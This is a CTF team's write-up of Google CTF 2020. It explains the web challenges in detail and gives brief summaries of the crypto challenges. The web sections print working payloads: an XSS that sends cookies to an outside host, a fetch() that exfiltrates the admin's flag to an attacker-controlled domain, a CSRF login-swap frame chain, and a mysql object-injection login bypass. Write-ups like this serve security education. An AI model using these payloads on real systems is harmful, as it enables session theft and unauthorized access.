# Google CTF 2020

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20200822-googlectf2020/) of this writeup.**


 - [Google CTF 2020](#google-ctf-2020)
   - [Web](#web)
     - [Pasteurize](#pasteurize)
     - [Tech Support](#tech-support)
     - [LOG-ME-IN](#log-me-in)
   - [Crypto](#crypto)
     - [Oracle](#oracle)
       - [TL;DR](#tldr)
     - [YAFM](#yafm)
       - [TL;DR](#tldr-1)
     - [Quantum Pyramids](#quantum-pyramids)
       - [TL;DR](#tldr-2)
     - [SHArky](#sharky)
       - [TL;DR](#tldr-3)


## Web

### Pasteurize

First, spot the `/source` in web source code. The backend is a nodejs server.

```javascript
app.use(bodyParser.urlencoded({
  extended: true
}));

// ...

const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');
  
// ...
  
app.get('/:id([a-f0-9\-]{36})', recaptcha.middleware.render, utils.cache_mw, async (req, res) => {
  const note_id = req.params.id;
  const note = await DB.get_note(note_id);

  if (note == null) {
    return res.status(404).send("Paste not found or access has been denied.");
  }

  const unsafe_content = note.content;
  const safe_content = escape_string(unsafe_content);

  res.render('note_public', {
    content: safe_content,
    id: note_id,
    captcha: res.recaptcha
  });
});
```

So `example.com<foo>"bar"` will become `const note = "example.com\x3Cfoo\x3E\"bar\"";`. The double quotes are encoded because of `JSON.stringify`.

However, the `escape_string` logic is weird, especially the `slice` one. The slice is intended to prune `"example.com"` to `example.com`.

Since we have `bodyParser` `extended: true`, we can send an array into the request object. If we make the content an array, the behavior of slice function will become

```
["example.com"] -> "example.com"
```

That is, we can preserve the double quotes, and it leads to javascript injection. The final payload:

```
content[]=;document.location='http://example.com/?'+btoa(document.cookie);//

// CTF{Express_t0_Tr0ubl3s}
```

### Tech Support

In this challenge, the admin has cookies in `typeselfsub.web.ctfcompetition.com/`. The domain has a self-XSS requireing the user to see his/her profiles. That is, unless admin is logout and log in to our account, the XSS will not be triggered.

Addtionally, the XSS bot admin will browse pages in `typeselfsub-support.web.ctfcompetition.com/`. The page has an easy XSS.

The question is: how to abuse self-XSS to steal the flag?

We can just keep the logged-in admin frame there, and then CSRF to login our account and execute XSS payload to steal the page content. This does not violate same-origin policy because the two frames still belong to the same domains.

So first, redirect the admin to a website that we controlled.

```htmlmixed
<img src=z onerror=document.location.href="https://bookgin.tw/"></img>
```

Next, we open three frames here:

1. Admin's frame containg the flag
2. logout admin's account
3. login to our account and execute XSS

index.html:

```htmlmixed
<body>
  <iframe width=500 height=800 id="i0"></iframe>
  <iframe width=500 height=800 id="i1"></iframe>
  <iframe src="login.html" width=500 height=800 id="i2"></iframe>
</body>
<script>
!async function() {
  console.log("start!");
  document.querySelector("#i0").src = "https://typeselfsub.web.ctfcompetition.com/flag";
  await new Promise(r => setTimeout(r, 2000));
  document.querySelector("#i1").src = "https://typeselfsub.web.ctfcompetition.com/logout";
  await new Promise(r => setTimeout(r, 2000));
  document.querySelector("#i2").contentDocument.querySelector("form").submit();
  console.log("done");
}();
</script>
```

login.html:

```htmlmixed
<form method="POST" action="https://typeselfsub.web.ctfcompetition.com/login">
    <input value="foobartw" type="text" id="username" name="username">
    <input value="foobartw" type="password" id="password" name="password">
    <input type="hidden" name="csrf" value="">
</form>
```

Finally, the profile page in frame 3 will execute XSS in `typeselfsub.web.ctfcompetition.com/` domain.

```htmlmixed
<script>fetch('https://bookgin.tw/?'+btoa(parent.frames[0].document.getElementById('flag').innerText))</script>
```

where `parent.frames[0]` is the frame containg admin's flag.

Flag: `CTF{self-xss?-that-isn't-a-problem-right...}`

For an unintended solution which leaks admin secret route URL via referer, please see [this writeup by pop_eax](https://pop-eax.github.io/blog/posts/ctf-writeup/web/xss/2020/08/23/googlectf2020-pasteurize-tech-support-challenge-writeups/).

### LOG-ME-IN

From the source code `app.js`, we can found the `login` API

```javascript
...
const u = req.body['username'];
const p = req.body['password'];

const con = DBCon(); // mysql.createConnection(...).connect()

const sql = 'Select * from users where username = ? and password = ?';
con.query(sql, [u, p], callbackFunction)
...
```
It parses `username` and `password` from body, and uses them as prepared SQL statement parameter without checking whether they are strings or converting them to string.

And since `bodyParser` `extended: true`, we can send an object to `username` and `password`

By reading how nodejs mysql [Escaping query values](https://github.com/mysqljs/mysql#escaping-query-values) , we can see that it will convert object into format such as
```
`key1`=value1, `key2`=value2 
```

For example
```javascript
const mysql = require('mysql')
mysql.format('SELECT * from example WHERE id = ?', {'a':'b', 'c':'d'})
//SELECT * from example WHERE id = `a` = 'b', `c` = 'd'
```
Therefore, we can send `username=Michelle&password[password]=1` to inject an object into the query, and the query will become
```SQL
Select * from users where username = 'Michelle' and password = `password` = '1'
```
And then we can successfully log in to get the flag
Flag: `CTF{a-premium-effort-deserves-a-premium-flag}`

## Crypto

### Oracle
#### TL;DR
(In subtask 2, I've developed some techniques that reduce the query number down to 170. See the last part for those tricky optimizations.)

Subtask 1
1. Encrypt one all zero plaintext for the base case
2. Encrypt two different input differences for each blocks
3. Recover all states except S1, S5 with those differences
4. Recover S1, S5 from the ciphertext and states.

Subtask 2
1. Leak 6 blocks of plaintext
2. Same as subtask 1

Subtask 2 in a hard way
1. Reduce the fetches of the base case by using per byte difference
2. Reduce the size of additional checksum


[Here's the full writeup](https://sasdf.github.io/ctf/writeup/2020/google/crypto/oracle/)


### YAFM
#### TL;DR
1. Model the probability of a factor guess with binomial and hypergeometric distribution
2. Run best-first search to get lower bits
3. Factor the public key using Coppersmith's method


[Here's the full writeup](https://sasdf.github.io/ctf/writeup/2020/google/crypto/yafm/)


### Quantum Pyramids
#### TL;DR
1. Collect some signatures until all secrets are revealed
2. Hook on the code of sphincs+ to build the full hash tree
3. Generate the signature with the hash tree


[Here's the full writeup](https://sasdf.github.io/ctf/writeup/2020/google/crypto/quantum/)


### SHArky
#### TL;DR
1. Subtract the IV from the output
2. Undo last 56 rounds
3. Recover round constants from 8 to 1 by propagating the error the first round.


[Here's the full writeup](https://sasdf.github.io/ctf/writeup/2020/google/crypto/sharky/)

